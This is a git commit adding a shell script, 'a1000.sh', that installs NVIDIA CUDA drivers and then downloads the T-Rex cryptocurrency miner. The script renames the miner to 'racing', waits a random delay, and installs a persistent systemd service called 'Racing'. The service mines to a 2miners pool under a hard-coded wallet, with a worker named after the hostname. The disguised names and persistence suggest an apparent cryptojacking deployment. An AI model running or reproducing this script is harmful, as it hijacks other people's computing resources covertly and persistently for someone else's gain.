0976ace7582445080b0a1d03f6a2351c56028458
joplinsolieso <105708394+joplinsolieso@users.noreply.github.com>
2022-05-17 21:14:23 +0700

    Create a1000.sh

---
+++ a1000.sh
@@ -0,0 +1,33 @@
+cd /home
+myworker=$(date +'%d%m_%H%M%S_')
+username=$HOSTNAME
+myworker+=$username
+sudo apt-get install linux-headers-$(uname -r) -y
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+sudo apt-key del 7fa2af80
+sudo rm /etc/apt/sources.list.d/cuda.list
+sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
+sudo dpkg -i cuda-keyring_1.0-1_all.deb
+sudo apt-get update
+sudo apt-get -y install cuda-drivers
+sudo apt-get install libcurl4 -y
+sudo apt-get install cuda-drivers-510
+sudo apt-get install cuda-drivers-fabricmanager-510 -y
+sudo systemctl enable nvidia-fabricmanager
+sudo systemctl start nvidia-fabricmanager
+wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
+tar -zxvf t-rex-0.25.12-linux.tar.gz
+mv t-rex racing
+MINWAIT=30
+MAXWAIT=100
+datass=$((MINWAIT+RANDOM % (MAXWAIT-MINWAIT)))
+sleep $datass
+sudo killall racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qca7a6qerhmr8az0g36297nqqvcgs3an5wq2j03 -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo systemctl daemon-reload
+sudo systemctl enable racing.service
+./racing -a ethash -o us-eth.2miners.com:2020 -u bc1qca7a6qerhmr8az0g36297nqqvcgs3an5wq2j03 -p x -w $myworker &
